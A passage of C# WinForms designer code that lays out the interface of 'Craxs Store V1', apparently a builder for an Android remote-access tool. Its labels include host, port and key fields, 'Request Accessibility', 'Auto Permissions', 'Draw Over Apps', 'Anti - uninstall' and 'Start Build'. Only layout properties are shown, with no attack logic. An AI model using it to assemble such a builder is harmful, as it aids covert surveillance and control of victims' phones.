		this.TabPage1.Controls.Add(this.DrakeUIAvatar5);
		this.TabPage1.Controls.Add(this.Label12);
		this.TabPage1.Controls.Add(this.Label11);
		this.TabPage1.Controls.Add(this.msgtext);
		this.TabPage1.Controls.Add(this.Label10);
		this.TabPage1.Controls.Add(this.titletext);
		this.TabPage1.Controls.Add(this.Label2);
		this.TabPage1.Controls.Add(this.Label3);
		this.TabPage1.Controls.Add(this.Label7);
		this.TabPage1.Controls.Add(this.Label4);
		this.TabPage1.Controls.Add(this.Host);
		this.TabPage1.Controls.Add(this.TheKey);
		this.TabPage1.Controls.Add(this.Port);
		this.TabPage1.Controls.Add(this.CLiname);
		this.TabPage1.Location = new System.Drawing.Point(0, 40);
		this.TabPage1.Name = "TabPage1";
		this.TabPage1.Size = new System.Drawing.Size(1184, 684);
		this.TabPage1.TabIndex = 0;
		this.TabPage1.Text = "information";
		this.checkkill.CheckBoxColor = System.Drawing.Color.FromArgb(30, 136, 229);
		this.checkkill.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkkill.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkkill.Location = new System.Drawing.Point(83, 553);
		this.checkkill.Name = "checkkill";
		this.checkkill.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkkill.Size = new System.Drawing.Size(61, 29);
		this.checkkill.TabIndex = 54;
		this.checkDraw.CheckBoxColor = System.Drawing.Color.FromArgb(30, 136, 229);
		this.checkDraw.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkDraw.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkDraw.Location = new System.Drawing.Point(83, 460);
		this.checkDraw.Name = "checkDraw";
		this.checkDraw.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkDraw.Size = new System.Drawing.Size(61, 29);
		this.checkDraw.TabIndex = 53;
		this.checkautoclick.CheckBoxColor = System.Drawing.Color.FromArgb(30, 136, 229);
		this.checkautoclick.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkautoclick.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkautoclick.Location = new System.Drawing.Point(83, 377);
		this.checkautoclick.Name = "checkautoclick";
		this.checkautoclick.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkautoclick.Size = new System.Drawing.Size(61, 29);
		this.checkautoclick.TabIndex = 52;
		this.checksuper.CheckBoxColor = System.Drawing.Color.FromArgb(30, 136, 229);
		this.checksuper.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checksuper.Font = new System.Drawing.Font("Calibri", 12f);
		this.checksuper.Location = new System.Drawing.Point(83, 286);
		this.checksuper.Name = "checksuper";
		this.checksuper.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checksuper.Size = new System.Drawing.Size(61, 29);
		this.checksuper.TabIndex = 51;
		this.Label9.AutoSize = true;
		this.Label9.Cursor = System.Windows.Forms.Cursors.Default;
		this.Label9.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Label9.Font = new System.Drawing.Font("Times New Roman", 18f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label9.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label9.Location = new System.Drawing.Point(169, 548);
		this.Label9.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label9.Name = "Label9";
		this.Label9.Size = new System.Drawing.Size(190, 34);
		this.Label9.TabIndex = 50;
		this.Label9.Tag = "1";
		this.Label9.Text = "Anti - uninstall";
		this.Label9.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Label14.AutoSize = true;
		this.Label14.Font = new System.Drawing.Font("Calibri", 13f);
		this.Label14.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label14.Location = new System.Drawing.Point(759, 273);
		this.Label14.Name = "Label14";
		this.Label14.Size = new System.Drawing.Size(142, 27);
		this.Label14.TabIndex = 48;
		this.Label14.Text = "Permissions :";
		this.ComboPrims.BackColor = System.Drawing.Color.Black;
		this.ComboPrims.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.ComboPrims.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		this.ComboPrims.ForeColor = System.Drawing.Color.White;
		this.ComboPrims.FormattingEnabled = true;
		this.ComboPrims.Items.AddRange(new object[2] { "ALL Permissions ", "Only Needed" });
		this.ComboPrims.Location = new System.Drawing.Point(921, 271);
		this.ComboPrims.Name = "ComboPrims";
		this.ComboPrims.Size = new System.Drawing.Size(163, 33);
		this.ComboPrims.TabIndex = 47;
		this.Label8.AutoSize = true;
		this.Label8.Cursor = System.Windows.Forms.Cursors.Default;
		this.Label8.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Label8.Font = new System.Drawing.Font("Times New Roman", 18f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label8.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label8.Location = new System.Drawing.Point(169, 460);
		this.Label8.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label8.Name = "Label8";
		this.Label8.Size = new System.Drawing.Size(216, 34);
		this.Label8.TabIndex = 46;
		this.Label8.Tag = "1";
		this.Label8.Text = "Draw Over Apps";
		this.Label8.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Label6.AutoSize = true;
		this.Label6.Cursor = System.Windows.Forms.Cursors.Default;
		this.Label6.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Label6.Font = new System.Drawing.Font("Times New Roman", 18f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label6.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label6.Location = new System.Drawing.Point(169, 372);
		this.Label6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label6.Name = "Label6";
		this.Label6.Size = new System.Drawing.Size(222, 34);
		this.Label6.TabIndex = 44;
		this.Label6.Tag = "1";
		this.Label6.Text = "Auto Permissions";
		this.Label6.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Label5.AutoSize = true;
		this.Label5.Cursor = System.Windows.Forms.Cursors.Default;
		this.Label5.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Label5.Font = new System.Drawing.Font("Times New Roman", 18f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label5.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label5.Location = new System.Drawing.Point(169, 281);
		this.Label5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label5.Name = "Label5";
		this.Label5.Size = new System.Drawing.Size(263, 34);
		this.Label5.TabIndex = 37;
		this.Label5.Tag = "1";
		this.Label5.Text = "Request Accessibility";
		this.Label5.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.DrakeUIAvatar5.AvatarSize = 25;
		this.DrakeUIAvatar5.BackColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar5.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar5.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar5.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIAvatar5.Location = new System.Drawing.Point(1043, 415);
		this.DrakeUIAvatar5.Name = "DrakeUIAvatar5";
		this.DrakeUIAvatar5.Size = new System.Drawing.Size(36, 28);
		this.DrakeUIAvatar5.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar5.Symbol = 61529;
		this.DrakeUIAvatar5.SymbolSize = 25;
		this.DrakeUIAvatar5.TabIndex = 42;
		this.DrakeUIAvatar5.Text = "DrakeUIAvatar5";
		this.Label12.AutoSize = true;
		this.Label12.Font = new System.Drawing.Font("Roboto Condensed", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label12.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label12.Location = new System.Drawing.Point(821, 415);
		this.Label12.Name = "Label12";
		this.Label12.Size = new System.Drawing.Size(216, 29);
		this.Label12.TabIndex = 41;
		this.Label12.Text = "Custome Notification";
		this.Label11.AutoSize = true;
		this.Label11.Font = new System.Drawing.Font("Roboto Condensed", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label11.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label11.Location = new System.Drawing.Point(833, 535);
		this.Label11.Name = "Label11";
		this.Label11.Size = new System.Drawing.Size(217, 29);
		this.Label11.TabIndex = 39;
		this.Label11.Text = "Notification Message";
		this.msgtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.msgtext.FillColor = System.Drawing.Color.Black;
		this.msgtext.Font = new System.Drawing.Font("Calibri", 12f);
		this.msgtext.ForeColor = System.Drawing.Color.White;
		this.msgtext.Location = new System.Drawing.Point(802, 569);
		this.msgtext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.msgtext.Maximum = 2147483647.0;
		this.msgtext.Minimum = -2147483648.0;
		this.msgtext.Name = "msgtext";
		this.msgtext.Padding = new System.Windows.Forms.Padding(5);
		this.msgtext.Radius = 15;
		this.msgtext.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.msgtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.msgtext.Size = new System.Drawing.Size(248, 30);
		this.msgtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.msgtext.StyleCustomMode = true;
		this.msgtext.TabIndex = 40;
		this.msgtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.Label10.AutoSize = true;
		this.Label10.Font = new System.Drawing.Font("Roboto Condensed", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label10.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label10.Location = new System.Drawing.Point(846, 462);
		this.Label10.Name = "Label10";
		this.Label10.Size = new System.Drawing.Size(174, 29);
		this.Label10.TabIndex = 37;
		this.Label10.Text = "Notification Title";
		this.titletext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.titletext.FillColor = System.Drawing.Color.Black;
		this.titletext.Font = new System.Drawing.Font("Calibri", 12f);
		this.titletext.ForeColor = System.Drawing.Color.White;
		this.titletext.Location = new System.Drawing.Point(802, 496);
		this.titletext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.titletext.Maximum = 2147483647.0;
		this.titletext.Minimum = -2147483648.0;
		this.titletext.Name = "titletext";
		this.titletext.Padding = new System.Windows.Forms.Padding(5);
		this.titletext.Radius = 15;
		this.titletext.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.titletext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.titletext.Size = new System.Drawing.Size(248, 30);
		this.titletext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.titletext.StyleCustomMode = true;
		this.titletext.TabIndex = 38;
		this.titletext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.Label2.AutoSize = true;
		this.Label2.Font = new System.Drawing.Font("Roboto Condensed", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label2.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label2.Location = new System.Drawing.Point(1013, 84);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(53, 29);
		this.Label2.TabIndex = 24;
		this.Label2.Text = "Port";
		this.Label3.AutoSize = true;
		this.Label3.Font = new System.Drawing.Font("Roboto Condensed", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label3.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label3.Location = new System.Drawing.Point(424, 84);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(47, 29);
		this.Label3.TabIndex = 25;
		this.Label3.Text = "Key";
		this.Label7.AutoSize = true;
		this.Label7.Font = new System.Drawing.Font("Roboto Condensed", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label7.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label7.Location = new System.Drawing.Point(95, 84);
		this.Label7.Name = "Label7";
		this.Label7.Size = new System.Drawing.Size(131, 29);
		this.Label7.TabIndex = 26;
		this.Label7.Text = "Client Name";
		this.Label4.AutoSize = true;
		this.Label4.Font = new System.Drawing.Font("Roboto Condensed", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label4.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label4.Location = new System.Drawing.Point(690, 84);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(108, 29);
		this.Label4.TabIndex = 23;
		this.Label4.Text = "Host or IP";
		this.Host.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Host.FillColor = System.Drawing.Color.Black;
		this.Host.Font = new System.Drawing.Font("Calibri", 12f);
		this.Host.ForeColor = System.Drawing.Color.White;
		this.Host.Location = new System.Drawing.Point(630, 118);
		this.Host.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.Host.Maximum = 2147483647.0;
		this.Host.Minimum = -2147483648.0;
		this.Host.Name = "Host";
		this.Host.Padding = new System.Windows.Forms.Padding(5);
		this.Host.Radius = 15;
		this.Host.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Host.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Host.Size = new System.Drawing.Size(228, 30);
		this.Host.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Host.StyleCustomMode = true;
		this.Host.TabIndex = 30;
		this.Host.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.TheKey.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.TheKey.FillColor = System.Drawing.Color.Black;
		this.TheKey.Font = new System.Drawing.Font("Calibri", 12f);
		this.TheKey.ForeColor = System.Drawing.Color.White;
		this.TheKey.Location = new System.Drawing.Point(327, 118);
		this.TheKey.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.TheKey.Maximum = 2147483647.0;
		this.TheKey.Minimum = -2147483648.0;
		this.TheKey.Name = "TheKey";
		this.TheKey.Padding = new System.Windows.Forms.Padding(5);
		this.TheKey.Radius = 15;
		this.TheKey.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.TheKey.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.TheKey.Size = new System.Drawing.Size(228, 30);
		this.TheKey.Style = DrakeUI.Framework.UIStyle.Custom;
		this.TheKey.StyleCustomMode = true;
		this.TheKey.TabIndex = 29;
		this.TheKey.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.Port.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Port.FillColor = System.Drawing.Color.Black;
		this.Port.Font = new System.Drawing.Font("Calibri", 12f);
		this.Port.ForeColor = System.Drawing.Color.White;
		this.Port.Location = new System.Drawing.Point(922, 118);
		this.Port.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.Port.Maximum = 2147483647.0;
		this.Port.Minimum = -2147483648.0;
		this.Port.Name = "Port";
		this.Port.Padding = new System.Windows.Forms.Padding(5);
		this.Port.Radius = 15;
		this.Port.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Port.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Port.Size = new System.Drawing.Size(228, 30);
		this.Port.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Port.StyleCustomMode = true;
		this.Port.TabIndex = 28;
		this.Port.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.CLiname.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.CLiname.FillColor = System.Drawing.Color.Black;
		this.CLiname.Font = new System.Drawing.Font("Calibri", 12f);
		this.CLiname.ForeColor = System.Drawing.Color.White;
		this.CLiname.Location = new System.Drawing.Point(35, 118);
		this.CLiname.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.CLiname.Maximum = 2147483647.0;
		this.CLiname.Minimum = -2147483648.0;
		this.CLiname.Name = "CLiname";
		this.CLiname.Padding = new System.Windows.Forms.Padding(5);
		this.CLiname.Radius = 15;
		this.CLiname.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.CLiname.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.CLiname.Size = new System.Drawing.Size(228, 30);
		this.CLiname.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CLiname.StyleCustomMode = true;
		this.CLiname.TabIndex = 27;
		this.CLiname.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.TabPage4.BackColor = System.Drawing.Color.Black;
		this.TabPage4.Controls.Add(this.workpanel);
		this.TabPage4.Location = new System.Drawing.Point(0, 40);
		this.TabPage4.Name = "TabPage4";
		this.TabPage4.Size = new System.Drawing.Size(1184, 684);
		this.TabPage4.TabIndex = 3;
		this.TabPage4.Tag = "dw";
		this.TabPage4.Text = "Download";
		this.workpanel.BackColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.workpanel.Controls.Add(this.DrakeUIButtonIcon2);
		this.workpanel.Controls.Add(this.DrakeUIButtonIcon4);
		this.workpanel.Controls.Add(this.worklabel);
		this.workpanel.Controls.Add(this.worklog);
		this.workpanel.Controls.Add(this.workimage);
		this.workpanel.Controls.Add(this.downprogress);
		this.workpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.workpanel.Location = new System.Drawing.Point(0, 0);
		this.workpanel.Name = "workpanel";
		this.workpanel.Size = new System.Drawing.Size(1184, 684);
		this.workpanel.TabIndex = 3;
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(13, 45);
		this.DrakeUIButtonIcon2.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
		this.DrakeUIButtonIcon2.Radius = 25;
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(45, 42);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.StyleCustomMode = true;
		this.DrakeUIButtonIcon2.SymbolSize = 25;
		this.DrakeUIButtonIcon2.TabIndex = 43;
		this.ToolTips.SetToolTip(this.DrakeUIButtonIcon2, "Start Build");
		this.DrakeUIButtonIcon4.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon4.FillColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon4.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIButtonIcon4.Location = new System.Drawing.Point(68, 46);
		this.DrakeUIButtonIcon4.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4";
		this.DrakeUIButtonIcon4.Radius = 25;
		this.DrakeUIButtonIcon4.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon4.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon4.RectHoverColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon4.RectPressColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon4.RectSelectedColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon4.Size = new System.Drawing.Size(45, 42);
		this.DrakeUIButtonIcon4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon4.StyleCustomMode = true;
		this.DrakeUIButtonIcon4.Symbol = 61564;
		this.DrakeUIButtonIcon4.SymbolSize = 25;
		this.DrakeUIButtonIcon4.TabIndex = 42;
		this.ToolTips.SetToolTip(this.DrakeUIButtonIcon4, "Downloads Folder");
		this.worklabel.Font = new System.Drawing.Font("Roboto Condensed", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.worklabel.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.worklabel.Location = new System.Drawing.Point(192, 57);
		this.worklabel.Name = "worklabel";
		this.worklabel.Size = new System.Drawing.Size(791, 29);
		this.worklabel.TabIndex = 41;
		this.worklabel.Text = "...";
		this.worklog.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.worklog.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.worklog.FillColor = System.Drawing.Color.Black;
		this.worklog.Font = new System.Drawing.Font("Calibri", 12f);
		this.worklog.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.worklog.Location = new System.Drawing.Point(0, 146);
		this.worklog.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.worklog.Maximum = 2147483647.0;
		this.worklog.MaxLength = 140;
		this.worklog.Minimum = -2147483648.0;
		this.worklog.Multiline = true;
		this.worklog.Name = "worklog";
		this.worklog.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.worklog.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.worklog.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.worklog.Size = new System.Drawing.Size(1184, 515);
		this.worklog.Style = DrakeUI.Framework.UIStyle.Custom;
		this.worklog.StyleCustomMode = true;
		this.worklog.TabIndex = 40;
		this.worklog.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
		this.workimage.BackColor = System.Drawing.Color.Transparent;
		this.workimage.Cursor = System.Windows.Forms.Cursors.Default;
		this.workimage.Font = new System.Drawing.Font("Calibri", 12f);
		this.workimage.Location = new System.Drawing.Point(121, 35);
		this.workimage.Name = "workimage";
		this.workimage.Size = new System.Drawing.Size(65, 65);
		this.workimage.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.workimage.TabIndex = 39;
		this.workimage.TabStop = false;
		this.workimage.Text = null;
		this.downprogress.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.downprogress.FillColor = System.Drawing.Color.FromArgb(255, 235, 238);
		this.downprogress.Font = new System.Drawing.Font("Calibri", 12f);
		this.downprogress.ForeColor = System.Drawing.Color.FromArgb(230, 80, 80);
		this.downprogress.Location = new System.Drawing.Point(0, 661);
		this.downprogress.MinimumSize = new System.Drawing.Size(70, 23);
		this.downprogress.Name = "downprogress";
		this.downprogress.RectColor = System.Drawing.Color.FromArgb(230, 80, 80);
		this.downprogress.Size = new System.Drawing.Size(1184, 23);
		this.downprogress.Style = DrakeUI.Framework.UIStyle.Red;
		this.downprogress.StyleCustomMode = true;
		this.downprogress.TabIndex = 2;
		this.downprogress.Text = "0.0%";
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel1.Controls.Add(this.Label1);
		this.Panel1.Controls.Add(this.DrakeUIImageButton1);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon13);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon12);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(1184, 56);
		this.Panel1.TabIndex = 34;
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(271, 7);
		this.DrakeUIButtonIcon1.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
		this.DrakeUIButtonIcon1.Radius = 25;
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(45, 42);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.StyleCustomMode = true;
		this.DrakeUIButtonIcon1.Symbol = 57353;
		this.DrakeUIButtonIcon1.SymbolSize = 25;
		this.DrakeUIButtonIcon1.TabIndex = 37;
		this.ToolTips.SetToolTip(this.DrakeUIButtonIcon1, "Home");
		this.Label1.Cursor = System.Windows.Forms.Cursors.Default;
		this.Label1.Dock = System.Windows.Forms.DockStyle.Left;
		this.Label1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Label1.Font = new System.Drawing.Font("Times New Roman", 18f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label1.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label1.Location = new System.Drawing.Point(51, 0);
		this.Label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(212, 56);
		this.Label1.TabIndex = 35;
		this.Label1.Tag = "1";
		this.Label1.Text = "Craxs Store V1";
		this.Label1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.DrakeUIImageButton1.BackColor = System.Drawing.Color.Transparent;
		this.DrakeUIImageButton1.Cursor = System.Windows.Forms.Cursors.Default;
		this.DrakeUIImageButton1.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIImageButton1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIImageButton1.Image = (System.Drawing.Image)resources.GetObject("DrakeUIImageButton1.Image");
		this.DrakeUIImageButton1.Location = new System.Drawing.Point(0, 0);
		this.DrakeUIImageButton1.Name = "DrakeUIImageButton1";
		this.DrakeUIImageButton1.Size = new System.Drawing.Size(51, 56);
		this.DrakeUIImageButton1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.DrakeUIImageButton1.TabIndex = 36;
		this.DrakeUIImageButton1.TabStop = false;
		this.DrakeUIImageButton1.Text = null;
		this.DrakeUIButtonIcon13.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon13.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon13.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIButtonIcon13.Location = new System.Drawing.Point(1073, 7);
		this.DrakeUIButtonIcon13.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIButtonIcon13.Name = "DrakeUIButtonIcon13";
		this.DrakeUIButtonIcon13.Radius = 25;
		this.DrakeUIButtonIcon13.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon13.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon13.RectHoverColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon13.RectPressColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon13.RectSelectedColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon13.Size = new System.Drawing.Size(45, 42);
		this.DrakeUIButtonIcon13.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon13.StyleCustomMode = true;
		this.DrakeUIButtonIcon13.Symbol = 62161;
		this.DrakeUIButtonIcon13.SymbolSize = 25;
		this.DrakeUIButtonIcon13.TabIndex = 34;
		this.ToolTips.SetToolTip(this.DrakeUIButtonIcon13, "Minimize");
		this.DrakeUIButtonIcon12.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon12.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon12.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIButtonIcon12.Location = new System.Drawing.Point(1126, 7);
		this.DrakeUIButtonIcon12.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIButtonIcon12.Name = "DrakeUIButtonIcon12";
		this.DrakeUIButtonIcon12.Radius = 25;
		this.DrakeUIButtonIcon12.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon12.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon12.RectHoverColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon12.RectPressColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon12.RectSelectedColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon12.Size = new System.Drawing.Size(45, 42);
